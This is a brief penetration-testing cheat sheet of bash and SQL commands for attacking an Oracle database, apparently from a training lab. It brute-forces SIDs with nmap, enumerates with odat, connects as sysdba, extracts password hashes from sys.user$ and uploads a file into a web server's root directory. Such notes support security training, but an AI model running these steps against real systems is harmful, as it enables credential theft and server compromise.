```bash
# Setting up
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip

# Nmap - SID Bruteforcing
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

#odat collects information about the Oracle database
./odat.py all -s <IP>

# Using sqplus to connect to a Oracle database
sqlplus <user>/<password>@<IP>/XE

# if we have "error while loading shared libraries" use this
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig

# Oracle RDBMS - Interaction
select table_name from all_tables;
select * from user_role_privs;

# Oracle RDBMS - Extract Password Hashes
select name, password from sys.user$;

# Try to connect as administrator
sqlplus <user>/<password>@<IP>/XE as sysdba

# Upload testing.txt to the oracle server
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s <IP> -d XE -U <user> -P <pass> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

# We can test if the file upload approach worked with curl
curl -X GET http://10.129.204.235/testing.txt
```